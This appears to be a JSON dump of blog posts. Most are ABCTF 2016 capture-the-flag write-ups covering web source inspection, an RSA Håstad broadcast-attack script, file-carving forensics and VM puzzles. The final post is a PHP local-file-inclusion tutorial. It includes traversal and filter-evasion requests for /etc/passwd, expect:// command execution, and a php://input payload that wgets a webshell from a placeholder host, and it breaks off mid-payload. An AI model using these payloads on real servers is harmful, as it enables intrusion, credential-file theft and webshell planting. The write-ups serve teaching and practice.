&lt;div class=\"row\"&gt; &lt;div class=\"col l4 push-l4\" id=\"response-wrong\"&gt; &lt;/div&gt; &lt;/div&gt; &lt;/body&gt; &lt;!-- 7xfsnj65gsklsjsdkj --&gt; &lt;script type=\"text/javascript\" src=\"fade.js\"&gt;&lt;/script&gt;&lt;/html&gt; We get a string in comment that look like a hard-to-guess password 7xfsnj65gsklsjsdkj Try this password and the flag will appear ... but shortly because of the js: fade.js 123$(document).ready(function()&#123; $(\"#response\").fadeOut(2000);&#125;); Block it with NoScript or be quick! Flag: ABCTF{insp3ct3d_dat_3l3m3nt}","categories":[{"name":"security","slug":"security","permalink":"https://rawsec.ml/categories/security/"},{"name":"writeups","slug":"security/writeups","permalink":"https://rawsec.ml/categories/security/writeups/"}],"tags":[{"name":"security","slug":"security","permalink":"https://rawsec.ml/tags/security/"},{"name":"web","slug":"web","permalink":"https://rawsec.ml/tags/web/"},{"name":"writeups","slug":"writeups","permalink":"https://rawsec.ml/tags/writeups/"},{"name":"ctf","slug":"ctf","permalink":"https://rawsec.ml/tags/ctf/"}]},{"title":"ABCTF - 10 - Virtual Box 1 - Virtual Series","slug":"ABCTF-2016-ABCTF-10-Virtual-Box-1-Virtual-Series","date":"2016-07-22T22:00:00.000Z","updated":"2017-02-07T18:23:37.415Z","comments":true,"path":"en/ABCTF-2016-ABCTF-10-Virtual-Box-1-Virtual-Series/","link":"","permalink":"https://rawsec.ml/en/ABCTF-2016-ABCTF-10-Virtual-Box-1-Virtual-Series/","excerpt":"","text":"Informations Version By Version Comment noraj 1.0 Creation CTF Name : ABCTF 2016 Website : http://abctf.xyz/ Type : Online Format : Jeopardy - Student CTF Time : link Description Do you know how to use a VM? Download the Virtual Machine [here][here]. [here]:https://drive.google.com/file/d/0B8VLfRLAO8TEZTVKRzUySTI4YVU/ Solution Start the Windows 98 VM C:\\WINDOWS\\Desktop\\flag 1.doc is on Desktop, content: 12You did it.ABCTF&#123;FREE_P0INTS&#125; Easy!","categories":[{"name":"security","slug":"security","permalink":"https://rawsec.ml/categories/security/"},{"name":"writeups","slug":"security/writeups","permalink":"https://rawsec.ml/categories/security/writeups/"}],"tags":[{"name":"security","slug":"security","permalink":"https://rawsec.ml/tags/security/"},{"name":"virtualization","slug":"virtualization","permalink":"https://rawsec.ml/tags/virtualization/"},{"name":"writeups","slug":"writeups","permalink":"https://rawsec.ml/tags/writeups/"},{"name":"ctf","slug":"ctf","permalink":"https://rawsec.ml/tags/ctf/"}]},{"title":"ABCTF - 125 - A Small Broadcast - Cryptography","slug":"ABCTF-2016-ABCTF-125-A-Small-Broadcast-Cryptography","date":"2016-07-22T22:00:00.000Z","updated":"2017-03-17T15:13:09.051Z","comments":true,"path":"en/ABCTF-2016-ABCTF-125-A-Small-Broadcast-Cryptography/","link":"","permalink":"https://rawsec.ml/en/ABCTF-2016-ABCTF-125-A-Small-Broadcast-Cryptography/","excerpt":"","text":"Informations Version By Translated by Version Comment Chill3d noraj 1.0 Creation CTF Name : ABCTF 2016 Website : http://abctf.xyz/ Type : Online Format : Jeopardy - Student CTF Time : link Description I RSA encrypted the same message 3 different times with the same exponent. Can you decrypt this? Solution Corrected challenge version URL: 1234567891011Problem updated on 7/17/16 @ 8PM EST - fixed valuesI RSA encrypted the same message 3 different times with the same exponent. Can you decrypt it?N1:79608037716527910392060670707842954224114341083822168077002144855358998405023007345791355970838437273653492726857398313047195654933011803740498167538754807659255275632647165202835846338059572102420992692073303341392512490988413552501419357400503232190597741120726276250753866130679586474440949586692852365179C1:34217065803425349356447652842993191079705593197469002356250751196039765990549766822180265723173964726087016890980051189787233837925650902081362222218365748633591895514369317316450142279676583079298758397507023942377316646300547978234729578678310028626408502085957725408232168284955403531891866121828640919987N2:58002222048141232855465758799795991260844167004589249261667816662245991955274977287082142794911572989261856156040536668553365838145271642812811609687362700843661481653274617983708937827484947856793885821586285570844274545385852401777678956217807768608457322329935290042362221502367207511491516411517438589637C2:48038542572368143315928949857213341349144690234757944150458420344577988496364306227393161112939226347074838727793761695978722074486902525121712796142366962172291716190060386128524977245133260307337691820789978610313893799675837391244062170879810270336080741790927340336486568319993335039457684586195656124176N3:95136786745520478217269528603148282473715660891325372806774750455600642337159386952455144391867750492077191823630711097423473530235172124790951314315271310542765846789908387211336846556241994561268538528319743374290789112373774893547676601690882211706889553455962720218486395519200617695951617114702861810811C3:55139001168534905791033093049281485849516290567638780139733282880064346293967470884523842813679361232423330290836063248352131025995684341143337417237119663347561882637003640064860966432102780676449991773140407055863369179692136108534952624411669691799286623699981636439331427079183234388844722074263884842748 The idea is to carry out a Håstad's broadcast attack on the RSA protocol. This attack will allow us to decipher a text transmitted multiple times, provided that the exponent of the key that was used to cipher this text be lower or equal to the number of obtained transmissions. So, here, exponent must be 1, 2 or 3 (it's often 3). Here is the script (comments are in French): 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980# RSA : Hastad Attack# Chill3dimport osdef eea(a,b): \"\"\"Extended Euclidean Algorithm for GCD\"\"\" v1 = [a,1,0] v2 = [b,0,1] while v2[0]&lt;&gt;0: p = v1[0]//v2[0] # floor division v2, v1 = map(lambda x, y: x-y,v1,[p*vi for vi in v2]), v2 return v1def inverse(m,k): \"\"\" Retourne b de maniere que b*m mod k = 1, ou 0 s'il n'y a pas de solution \"\"\" v = eea(m,k) return (v[0]==1)*(v[1] % k)def crt(N,e): \"\"\" Theoreme des reste chinois: N = Liste des modulo des clefs publiques e = Exposant des clefs publiques Chinese Remainder Theorem: ms = list of pairwise relatively prime integers as = remainders when x is divided by ms (ai is 'each in as', mi 'each in ms') The solution for x modulo M (M = product of ms) will be: x = a1*M1*y1 + a2*M2*y2 + ... + ar*Mr*yr (mod M), where Mi = M/mi and yi = (Mi)^-1 (mod mi) for 1 &lt;= i &lt;= r. \"\"\" M = reduce(lambda x, y: x*y,N) # Multiplication des N ; multiply N together Ms = [M/mi for mi in N] # Liste de tous les M/N list of all M/mi ys = [inverse(Mi, mi) for Mi,mi in zip(Ms,N)] # Utilise l'inverse,eea ; uses inverse,eea return reduce(lambda x, y: x+y,[ai*Mi*yi for ai,Mi,yi in zip(e,Ms,ys)]) % Mdef root(x,n): \"\"\" Fait une racine d'ordre n sur le nombre x Finds the integer component of the n'th root of x, an integer such that y ** n &lt;= x &lt; (y + 1) ** n. \"\"\" high = 1 while high ** n &lt; x: high *= 2 low = high/2 while low &lt; high: mid = (low + high) // 2 if low &lt; mid and mid**n &lt; x: low = mid elif high &gt; mid and mid**n &gt; x: high = mid else: return mid return mid + 1#Exposant commun aux 3 messagese=3#Modulo des cles publiquesN=[79608037716527910392060670707842954224114341083822168077002144855358998405023007345791355970838437273653492726857398313047195654933011803740498167538754807659255275632647165202835846338059572102420992692073303341392512490988413552501419357400503232190597741120726276250753866130679586474440949586692852365179,58002222048141232855465758799795991260844167004589249261667816662245991955274977287082142794911572989261856156040536668553365838145271642812811609687362700843661481653274617983708937827484947856793885821586285570844274545385852401777678956217807768608457322329935290042362221502367207511491516411517438589637,95136786745520478217269528603148282473715660891325372806774750455600642337159386952455144391867750492077191823630711097423473530235172124790951314315271310542765846789908387211336846556241994561268538528319743374290789112373774893547676601690882211706889553455962720218486395519200617695951617114702861810811]#Messages communiques avec la meme cle priveey=[34217065803425349356447652842993191079705593197469002356250751196039765990549766822180265723173964726087016890980051189787233837925650902081362222218365748633591895514369317316450142279676583079298758397507023942377316646300547978234729578678310028626408502085957725408232168284955403531891866121828640919987,48038542572368143315928949857213341349144690234757944150458420344577988496364306227393161112939226347074838727793761695978722074486902525121712796142366962172291716190060386128524977245133260307337691820789978610313893799675837391244062170879810270336080741790927340336486568319993335039457684586195656124176,55139001168534905791033093049281485849516290567638780139733282880064346293967470884523842813679361232423330290836063248352131025995684341143337417237119663347561882637003640064860966432102780676449991773140407055863369179692136108534952624411669691799286623699981636439331427079183234388844722074263884842748]#On applique le theoreme des restes Chinois sur N et yF=crt(N,y)print \"F\",F#On fait une racine cubique de Fintflag = root(F,e)print \"intflag\",intflag#On affiche sa valeurflag = hex(intflag)[2:-1].decode('hex')print flag","categories":[{"name":"security","slug":"security","permalink":"https://rawsec.ml/categories/security/"},{"name":"writeups","slug":"security/writeups","permalink":"https://rawsec.ml/categories/security/writeups/"}],"tags":[{"name":"security","slug":"security","permalink":"https://rawsec.ml/tags/security/"},{"name":"crypto","slug":"crypto","permalink":"https://rawsec.ml/tags/crypto/"},{"name":"writeups","slug":"writeups","permalink":"https://rawsec.ml/tags/writeups/"},{"name":"ctf","slug":"ctf","permalink":"https://rawsec.ml/tags/ctf/"}]},{"title":"ABCTF - 15 - Just open it - Forensics","slug":"ABCTF-2016-ABCTF-15-Just-open-it-Forensics","date":"2016-07-22T22:00:00.000Z","updated":"2017-02-07T18:23:37.412Z","comments":true,"path":"en/ABCTF-2016-ABCTF-15-Just-open-it-Forensics/","link":"","permalink":"https://rawsec.ml/en/ABCTF-2016-ABCTF-15-Just-open-it-Forensics/","excerpt":"","text":"Informations Version By Version Comment noraj 1.0 Creation CTF Name : ABCTF 2016 Website : http://abctf.xyz/ Type : Online Format : Jeopardy - Student CTF Time : link Description I'm almost positive we put a flag in this file. Can you find it for me? Solution Try some simple reflex like: 12strings 676F6F645F6A6F625F6275745F746869735F69736E745F7468655F666C6167.jpg | grep -i abcP ABCTF&#123;forensics_1_tooo_easy?&#125;","categories":[{"name":"security","slug":"security","permalink":"https://rawsec.ml/categories/security/"},{"name":"writeups","slug":"security/writeups","permalink":"https://rawsec.ml/categories/security/writeups/"}],"tags":[{"name":"security","slug":"security","permalink":"https://rawsec.ml/tags/security/"},{"name":"writeups","slug":"writeups","permalink":"https://rawsec.ml/tags/writeups/"},{"name":"ctf","slug":"ctf","permalink":"https://rawsec.ml/tags/ctf/"},{"name":"forensics","slug":"forensics","permalink":"https://rawsec.ml/tags/forensics/"}]},{"title":"ABCTF - 50 - Archive Me - Reconaissance","slug":"ABCTF-2016-ABCTF-50-Archive-Me-Reconaissance","date":"2016-07-22T22:00:00.000Z","updated":"2017-02-07T18:23:37.402Z","comments":true,"path":"en/ABCTF-2016-ABCTF-50-Archive-Me-Reconaissance/","link":"","permalink":"https://rawsec.ml/en/ABCTF-2016-ABCTF-50-Archive-Me-Reconaissance/","excerpt":"","text":"Informations Version By Version Comment noraj 1.0 Creation CTF Name : ABCTF 2016 Website : http://abctf.xyz/ Type : Online Format : Jeopardy - Student CTF Time : link Description If you could look at our website from a while ago im sure the flag would be there... Solution Ok so we are looking for a cached version of http://abctf.xyz/ There is two main services: Google Web Cache Archive.org and his WayBack Machine You can immediatly forget Google cache because it only keep the last cache and the title of the challenge is Archive Me so there is more chances that we have to use Archive.org You can try Google Web Cache anyway but there is nothing interesting. Now lets try Archive.org: The website was saved 2 times on May 10, 2016 at 19:17:53 and at 19:23:07. By default the one shown is the one at 19:17:53 which is not the good one but on the other you can see ABCTF{Archives_are_useful!} one the hoem page","categories":[{"name":"security","slug":"security","permalink":"https://rawsec.ml/categories/security/"},{"name":"writeups","slug":"security/writeups","permalink":"https://rawsec.ml/categories/security/writeups/"}],"tags":[{"name":"security","slug":"security","permalink":"https://rawsec.ml/tags/security/"},{"name":"writeups","slug":"writeups","permalink":"https://rawsec.ml/tags/writeups/"},{"name":"ctf","slug":"ctf","permalink":"https://rawsec.ml/tags/ctf/"},{"name":"guessing","slug":"guessing","permalink":"https://rawsec.ml/tags/guessing/"}]},{"title":"ABCTF - 75 - Virtual Box 5 - Virtual Series","slug":"ABCTF-2016-ABCTF-75-Virtual-Box-5-Virtual-Series","date":"2016-07-22T22:00:00.000Z","updated":"2017-02-07T18:23:37.395Z","comments":true,"path":"en/ABCTF-2016-ABCTF-75-Virtual-Box-5-Virtual-Series/","link":"","permalink":"https://rawsec.ml/en/ABCTF-2016-ABCTF-75-Virtual-Box-5-Virtual-Series/","excerpt":"","text":"Informations Version By Version Comment noraj 1.0 Creation CTF Name : ABCTF 2016 Website : http://abctf.xyz/ Type : Online Format : Jeopardy - Student CTF Time : link Description I accidentaly closed out this odd message I found. Can you get it back? Solution Open Internet Explorer (IE) Open the historic There is a picture, it's text in Wingdings 3 font Translate it to a normal police: ABCTF{ITS_C00L_L00KING_BACK}","categories":[{"name":"security","slug":"security","permalink":"https://rawsec.ml/categories/security/"},{"name":"writeups","slug":"security/writeups","permalink":"https://rawsec.ml/categories/security/writeups/"}],"tags":[{"name":"security","slug":"security","permalink":"https://rawsec.ml/tags/security/"},{"name":"virtualization","slug":"virtualization","permalink":"https://rawsec.ml/tags/virtualization/"},{"name":"writeups","slug":"writeups","permalink":"https://rawsec.ml/tags/writeups/"},{"name":"ctf","slug":"ctf","permalink":"https://rawsec.ml/tags/ctf/"}]},{"title":"ABCTF - 35 - The Flash - Web Exploitation","slug":"ABCTF-2016-ABCTF-35-The-Flash-Web-Exploitation","date":"2016-07-22T22:00:00.000Z","updated":"2017-02-07T18:23:37.412Z","comments":true,"path":"en/ABCTF-2016-ABCTF-35-The-Flash-Web-Exploitation/","link":"","permalink":"https://rawsec.ml/en/ABCTF-2016-ABCTF-35-The-Flash-Web-Exploitation/","excerpt":"","text":"Informations Version By Version Comment noraj 1.0 Creation CTF Name : ABCTF 2016 Website : http://abctf.xyz/ Type : Online Format : Jeopardy - Student CTF Time : link Description Can you somehow get the flag from [this][this] website? [this]:http://yrmyzscnvh.abctf.xyz/web2/ Solution Display source code CTRL + U 1234567891011121314151617181920212223242526272829303132333435363738&lt;html&gt; &lt;head&gt; &lt;link rel=\"stylesheet\" href=\"main.css\"&gt; &lt;link href='https://fonts.googleapis.com/css?family=Inconsolata' rel='stylesheet' type='text/css'&gt; &lt;script src=\"https://ajax.googleapis.com/ajax/libs/jquery/1.12.2/jquery.min.js\"&gt;&lt;/script&gt; &lt;link rel=\"stylesheet\" href=\"https://cdnjs.cloudflare.com/ajax/libs/materialize/0.97.6/css/materialize.min.css\"&gt; &lt;/head&gt; &lt;body&gt; &lt;div class=\"row\"&gt; &lt;div class=\"col l6 push-l3\"&gt; &lt;center&gt;&lt;h3 class=\"white-text\"&gt;Web 2&lt;/h3&gt;&lt;br&gt;&lt;/center&gt; &lt;/div&gt; &lt;/div&gt; &lt;div style=\"margin-top: 20%\" class=\"row\"&gt; &lt;div class=\"col l4 push-l4\"&gt; &lt;form action=\".\" method=\"post\"&gt; &lt;h5 class=\"white-text\"&gt;Password: &lt;/h5&gt; &lt;input type=\"password\" name=\"password\" required&gt; &lt;input id=\"submit\" type=\"submit\" value=\"Submit\"&gt; &lt;/form&gt; &lt;/div&gt; &lt;/div&gt; &lt;div class=\"row\"&gt; &lt;div class=\"col l4 push-l4\" id=\"response-wrong\"&gt; &lt;/div&gt; &lt;/div&gt; &lt;/body&gt; &lt;!-- c3RvcHRoYXRqcw== --&gt; &lt;script type=\"text/javascript\" src=\"fade.js\"&gt;&lt;/script&gt;&lt;/html&gt; We can see a base64 string c3RvcHRoYXRqcw== 12echo -n &quot;c3RvcHRoYXRqcw==&quot; | base64 -d &amp;&amp; echo &quot;&quot;stopthatjs So use stopthatjs as password and then you see HAAAAaaaaaaaa! and the flag displayed very very shortly Yes because there is this fade script: fade.js 12345678910$(document).ready(function()&#123; $(\"#response-wrong\").fadeOut(1500); setTimeout( function() &#123; $('#response').text('HAAAAaaaaaaaa!') $('#response').fadeOut(1500); &#125;, 20);&#125;); So block it, for example with NoScript =&gt; ABCTF{no(d3)_js_is_s3cur3_dasjkhadbkjfbjfdjbfsdajfasdl}","categories":[{"name":"security","slug":"security","permalink":"https://rawsec.ml/categories/security/"},{"name":"writeups","slug":"security/writeups","permalink":"https://rawsec.ml/categories/security/writeups/"}],"tags":[{"name":"security","slug":"security","permalink":"https://rawsec.ml/tags/security/"},{"name":"web","slug":"web","permalink":"https://rawsec.ml/tags/web/"},{"name":"writeups","slug":"writeups","permalink":"https://rawsec.ml/tags/writeups/"},{"name":"ctf","slug":"ctf","permalink":"https://rawsec.ml/tags/ctf/"}]},{"title":"ABCTF - 30 - GZ - Forensics","slug":"ABCTF-2016-ABCTF-30-GZ-Forensics","date":"2016-07-22T22:00:00.000Z","updated":"2017-02-07T18:23:37.388Z","comments":true,"path":"en/ABCTF-2016-ABCTF-30-GZ-Forensics/","link":"","permalink":"https://rawsec.ml/en/ABCTF-2016-ABCTF-30-GZ-Forensics/","excerpt":"","text":"Informations Version By Version Comment noraj 1.0 Creation CTF Name : ABCTF 2016 Website : http://abctf.xyz/ Type : Online Format : Jeopardy - Student CTF Time : link Description We shot a flag into [this][this] file but some things got messed up on the way... [this]:https://mega.nz/#!z4dlBSTb!5A2R5e6O9xYFYLhAcYUL8vRio4MW6dSfOWdEMaYuE80 &quot;Mega&quot; Solution Not so much interesting in raw: 12cat flag\u001f�\b\b^\u000fpW\u0000\u0003flag\u0000str\u000eq�N*��N͋��,(H-��\u0002\u0000��%�\u0015\u0000\u0000\u0000 Let's check what is that: 12file flagflag: gzip compressed data, was &quot;flag&quot;, last modified: Sun Jun 26 17:22:38 2016, from Unix Ok fine, if it's a gzip archive let's extract it 12gzip -dc flag &gt; test &amp;&amp; cat testABCTF&#123;broken_zipper&#125; I don't care that is a broken archive! I got my flag: ABCTF{broken_zipper}","categories":[{"name":"security","slug":"security","permalink":"https://rawsec.ml/categories/security/"},{"name":"writeups","slug":"security/writeups","permalink":"https://rawsec.ml/categories/security/writeups/"}],"tags":[{"name":"security","slug":"security","permalink":"https://rawsec.ml/tags/security/"},{"name":"writeups","slug":"writeups","permalink":"https://rawsec.ml/tags/writeups/"},{"name":"ctf","slug":"ctf","permalink":"https://rawsec.ml/tags/ctf/"},{"name":"forensics","slug":"forensics","permalink":"https://rawsec.ml/tags/forensics/"}]},{"title":"ABCTF - 30 - TGIF - Programming","slug":"ABCTF-2016-ABCTF-30-TGIF-Programming","date":"2016-07-22T22:00:00.000Z","updated":"2017-02-07T18:23:37.405Z","comments":true,"path":"en/ABCTF-2016-ABCTF-30-TGIF-Programming/","link":"","permalink":"https://rawsec.ml/en/ABCTF-2016-ABCTF-30-TGIF-Programming/","excerpt":"","text":"Informations Version By Version Comment noraj 1.0 Creation CTF Name : ABCTF 2016 Website : http://abctf.xyz/ Type : Online Format : Jeopardy - Student CTF Time : link Description Friday is the best day of the week, and so I really want to know how many Fridays there are in [this][this] file. But, with a twist. I want to know how many Fridays there are one year later than each date. [this]:https://gist.github.com/LiamRahav/0cbf82b8bc3a41deafc0403f1b1dd573 &quot;Gist&quot; Hint: For example, if you got November 21, 2001, I want to know if November 21, 2002 is a Friday. Also, the answer is in the format ABCTF{} Note: TGIF stands for Thank God It's Friday Solution Write a script that parse the date.txt file and count the number of Friday 12345678910111213141516171819202122232425#!/usr/bin/env python2import localefrom datetime import datetimeimport calendarlocale.setlocale(locale.LC_ALL, 'en_US.UTF-8')calendar.setfirstweekday(calendar.MONDAY)# strptime : https://docs.python.org/2/library/datetime.html#datetime.datetime.strptime# format : https://docs.python.org/2/library/datetime.html#strftime-and-strptime-behaviordate_format = '%B %d, %Y'i = 0with open('date.txt', 'r') as date_file: for line in date_file: date_string = line.rstrip() date_object = datetime.strptime(date_string, date_format) if not (calendar.isleap(date_object.year) and date_object.day == 29): date_object = date_object.replace(year = date_object.year + 1) if date_object.isoweekday() == 5: # Friday i += 1print('ABCTF&#123;' + str(i) + '&#125;') This instruction if not (calendar.isleap(date_object.year) and date_object.day == 29) : was to avoid bug with February 29, 2004 because 2004 was a leap year and that February 29, 2005 is not existing so. So when running my script I got: 12python3 date.pyABCTF&#123;193&#125; That's not the good flag but maybe that is because of the 29 of February so I tried ABCTF{194} and it's good!","categories":[{"name":"security","slug":"security","permalink":"https://rawsec.ml/categories/security/"},{"name":"writeups","slug":"security/writeups","permalink":"https://rawsec.ml/categories/security/writeups/"}],"tags":[{"name":"security","slug":"security","permalink":"https://rawsec.ml/tags/security/"},{"name":"programming","slug":"programming","permalink":"https://rawsec.ml/tags/programming/"},{"name":"writeups","slug":"writeups","permalink":"https://rawsec.ml/tags/writeups/"},{"name":"ctf","slug":"ctf","permalink":"https://rawsec.ml/tags/ctf/"}]},{"title":"ABCTF - 60 - MoonWalk - Forensics","slug":"ABCTF-2016-ABCTF-60-MoonWalk-Forensics","date":"2016-07-22T22:00:00.000Z","updated":"2017-02-07T18:23:37.408Z","comments":true,"path":"en/ABCTF-2016-ABCTF-60-MoonWalk-Forensics/","link":"","permalink":"https://rawsec.ml/en/ABCTF-2016-ABCTF-60-MoonWalk-Forensics/","excerpt":"","text":"Informations Version By Translated by Version Comment Chill3d noraj 1.0 Creation CTF Name : ABCTF 2016 Website : http://abctf.xyz/ Type : Online Format : Jeopardy - Student CTF Time : link Description There is something a little off about [this][this] picture. If you could help us we could give you some points! Just find us a flag! [this]:https://mega.nz/#!q0UyATRS!k2MYymbvEHYy9nVA0awvKMwgKvrEIrPkZ2stcMuGf-E TL;DR Solution First, we'll check file type: 12file PurpleThing.pngPurpleThing.png: PNG image data, 3200 x 2953, 8-bit/color RGBA, non-interlaced Because it's a Forensics challenge, we can look for other files hidden in this image: 12345678910binwalk PurpleThing.pngDECIMAL HEXADECIMAL DESCRIPTION--------------------------------------------------------------------------------0 0x0 PNG image, 3200 x 2953, 8-bit/color RGBA, non-interlaced85 0x55 Zlib compressed data, best compression2757 0xAC5 Zlib compressed data, best compression765455 0xBAE0F JPEG image data, JFIF standard 1.01765485 0xBAE2D TIFF image data, big-endian, offset of first image directory: 81809691 0x1B9D1B StuffIt Deluxe Segment (data): f Hilights on the JPEG file found: intersting! So we'll launch a filecarving tool to inspect the file and look for magic headers to recover hidden files: 1234567891011121314151617181920212223242526foremost -v PurpleThing.pngForemost version 1.5.7 by Jesse Kornblum, Kris Kendall, and Nick MikusAudit FileForemost started at Thu Jul 21 22:20:19 2016Invocation: foremost -v PurpleThing.pngOutput directory: /root/CTF/ABCTF/60-MoonWalk-Forensics/outputConfiguration file: /etc/foremost.confProcessing: PurpleThing.png|------------------------------------------------------------------File: PurpleThing.pngStart: Thu Jul 21 22:20:19 2016Length: 2 MB (2354256 bytes)Num Name (bs=512) Size File Offset Comment0: 00001495.jpg 1 MB 765455 *|Finish: Thu Jul 21 22:20:20 20161 FILES EXTRACTEDjpg:= 1------------------------------------------------------------------Foremost finished at Thu Jul 21 22:20:20 2016 Now let's see the image: display output/jpg/00001495.jpg We find the flag: ABCTF{PNG_S0_C00l}","categories":[{"name":"security","slug":"security","permalink":"https://rawsec.ml/categories/security/"},{"name":"writeups","slug":"security/writeups","permalink":"https://rawsec.ml/categories/security/writeups/"}],"tags":[{"name":"security","slug":"security","permalink":"https://rawsec.ml/tags/security/"},{"name":"writeups","slug":"writeups","permalink":"https://rawsec.ml/tags/writeups/"},{"name":"ctf","slug":"ctf","permalink":"https://rawsec.ml/tags/ctf/"},{"name":"forensics","slug":"forensics","permalink":"https://rawsec.ml/tags/forensics/"}]},{"title":"ABCTF - 60 - Virtual Box 4 - Virtual Series","slug":"ABCTF-2016-ABCTF-60-Virtual-Box-4-Virtual-Series","date":"2016-07-22T22:00:00.000Z","updated":"2017-02-07T18:23:37.392Z","comments":true,"path":"en/ABCTF-2016-ABCTF-60-Virtual-Box-4-Virtual-Series/","link":"","permalink":"https://rawsec.ml/en/ABCTF-2016-ABCTF-60-Virtual-Box-4-Virtual-Series/","excerpt":"","text":"Informations Version By Version Comment noraj 1.0 Creation CTF Name : ABCTF 2016 Website : http://abctf.xyz/ Type : Online Format : Jeopardy - Student CTF Time : link Description What's this? Solution Start &gt; Documents &gt; whats this (it's a recent file) Open it &gt; Content is: where am i? Start &gt; Documents &gt; whats this Right click &gt; Properties File is in: C:\\Program Files\\Outlook Express\\ABCTF{Y0U_F0UND_ME}\\what this.txt I let find you the flag :D","categories":[{"name":"security","slug":"security","permalink":"https://rawsec.ml/categories/security/"},{"name":"writeups","slug":"security/writeups","permalink":"https://rawsec.ml/categories/security/writeups/"}],"tags":[{"name":"security","slug":"security","permalink":"https://rawsec.ml/tags/security/"},{"name":"virtualization","slug":"virtualization","permalink":"https://rawsec.ml/tags/virtualization/"},{"name":"writeups","slug":"writeups","permalink":"https://rawsec.ml/tags/writeups/"},{"name":"ctf","slug":"ctf","permalink":"https://rawsec.ml/tags/ctf/"}]},{"title":"Local File Inclusion (LFI) and Remote Code Execution (RCE) vulnerabilities for PHP","slug":"local-file-inclusion-remote-code-execution-vulnerability","date":"2016-07-08T22:00:00.000Z","updated":"2016-11-02T23:00:00.000Z","comments":true,"path":"en/local-file-inclusion-remote-code-execution-vulnerability/","link":"","permalink":"https://rawsec.ml/en/local-file-inclusion-remote-code-execution-vulnerability/","excerpt":"","text":"Local File Inclusion (LFI) is a type of vulnerability concerning web server. It allow an attacker to include a local file on the web server. It occurs due to the use of not properly sanitized user input. This can lead to: outpouting source code or sensitive information code execution (server-side/client-side) Denial of service (DoS) Examples I'll give some examples in PHP but it can also occurs in Perl, ASP, JSP, or whatever. Basic includes Server code: 123456&lt;?php$file = $_GET['file'];if(isset($file))&#123; include(\"$file\");&#125; Legitimate request: 1http://example.com/index.php?file=contact.php Bad request: 1http://example.com/index.php?file=/etc/passwd Here an attacker can simply chose to modify the GET request to give a file that is not in the web serer folder. Directory traversal attack Server code: 123456&lt;?php$file = $_GET['file'];if(isset($file))&#123; include(\"lib/functions/$file\");&#125; Legitimate request: 1http://example.com/index.php?file=displaycontent.php Bad request: 1http://example.com/index.php?file=../../../../../etc/passwd Here an attacker can use relative path to get out of the web server folder. Null Byte Injection Server code: 123456&lt;?php$file = $_GET['file'];if(isset($file))&#123; include(\"lib/functions/$file.php\");&#125; Legitimate request: 1http://example.com/index.php?file=displaycontent Bad request: 1http://example.com/index.php?file=../../../../../etc/passwd%00 Here the script force to use .php file extension, but an attacker, by adding a null byte the the path, can drop the extension. Why? %00 is the http encoded version of 0x00 in hex. It's the null caracter, a null byte. In C it's written \\0 and it means the string termination character so that will stop processing the string immediately. PHP (like other web server lang) require to process high-level code at system level and it's usually accomplished by using C/C++ functions. Bytes following the delimiter will be ignored. If in php we have: 1$tmp='try'; In C we have: 12345char tmp[4];tmp[0] = 't';tmp[1] = 'r';tmp[2] = 'y';tmp[3] = '\\0'; so if a null byte is injected int php 1$tmp='try\\0next' Will procude in C: 12345678910char tmp[9];tmp[0] = 't';tmp[1] = 'r';tmp[2] = 'y';tmp[3] = '\\0';tmp[4] = 'n';tmp[5] = 'e';tmp[6] = 'x';tmp[7] = 't';tmp[8] = '\\0'; Go here for more details. Note: Null byte injection has been fixed in PHP 5.3.4 (unsupported). Filter Evasion Someone aware of previous vulnerabilities may think he will be secure wit a proper filter like: 123456&lt;?php$file = str_replace('../', '', $_GET['file']);if(isset($file))&#123; include(\"lib/functions/$file\");&#125; Legitimate request: 1http://example.com/index.php?file=displaycontent Bad request (HTTP char encoding): 1http://example.com/index.php?file=..%2F..%2F..%2F..%2F..%2Fetc/passwd or bad request (double all chars): 1http://example.com/index.php?file=....//....//....//....//....//etc/passwd The script replace all ../ with nothing but what if we encode slashs or dotes? or doubling them? The first method won't work on recent PHP version but the second one will work nearly every times. Double encoding Sometimes it's possible to encode some characters of the URL to bypass filters as we have seen previously. This is because the browser decodes the input but PHP does not. Cf. OWASP: By using double encoding it’s possible to bypass security filters that only decode user input once. The second decoding process is executed by the backend platform or modules that properly handle encoded data, but don't have the corresponding security checks in place. For example if urlencode() is used in PHP. So to continue to bypass the filter a double encoding is needed: We encode the data the first time, for example ../etc/passwd begins %2E%2E%2Fetc%2Fpasswd And now encode the %: %252E%252E%252Fetc%252Fpasswd Path truncation As all version of PHP since 5.3.4 are no more vulnerable to null byte injection, we need more methods to bypass extensions filter such as: 1include('lib/functions/' + $_GET['file'] + '.php'); Facts: on UNIX /./etc/passwd is the same as /etc/passwd on PHP trailing slash are often stripped off so /etc/passwd/ is the same as /etc/passwd on PHP as trailing slash are stripped off, they can be added as much as we want so /etc/passwd////// is the same as /etc/passwd on PHP ./ can be appended as many tiems as you want to a path so /etc/passwd/., /etc/passwd/./, /etc/passwd/././. are all the same as /etc/passwd. But there is another fact that is interesting to bypass extensions filter: on a lot of PHP installation, filenames longer than 4096 bytes are silently truncated! Characters after the firsts 4096 bytes are discarded and no error is triggered. So what? Let's craft a very long path to discard .php extension! Take your request and append a thousand times ./ to ../../../etc/passwd/./././././&lt;...&gt; so will get ../../../etc/passwd/./././././&lt;...&gt;/././.php but the filename will be longer than 4096 bytes so the overlong part will be dropped. So we'll just get our request and thousand times ./ that will be equivalent to ../../../etc/passwd. Reverse path truncation It also exist the reverse version of path truncation. This works by trying to fill the file name from the beginning to exceed the MAX_PATH value. But this method has a disadvantage: you have to inject the exact number of bytes to truncate only the .php extension. If too much ../ are injected the filename will also be truncated. Plus, that's why you'll need to add some characters if the path has not the good length because bytes are injected by 3 due to ../. Details can be found here. php://filter You found a LFI, you included the file but you can't see its content? Some file like config.php or libraries of functions are only executed but not shown. So to help us show them, we can use some PHP wrappers. A famous one is index.php?page=php://filter/read=convert.base64-encode/resource=config, this filter will encode the page in base64 and show the result like if we have done index.php?page=config and then base64 it. expect:// A rare but very useful wrapper is expect://, it allows execution of system commands via php. But it is not enabled by default, an extension needs to be installed. 1http://example.com/index.php?file=expect://ls php://input php://input allows to send payload via POST request. Request: 1http://example.com/index.php?file=php://input Post data (uploading a webshell): 1&lt;?php system(&apos;wget http://x.x.x.x/php-shell.php -O /var/www/html/shell.php&apos;); ?&gt; Post data (getting server infos): 1&lt;?php phpinfo(); ?&gt; data:// data:// can be used to include executable PHP code. 1http://example.com/index.php?file=data://text/plain;base64,PD9waHAgcGhwaW5mbygpOyA2fPg%3d%3d or 1http://example.com/index.php?file=data:text/plain;,&lt;?php 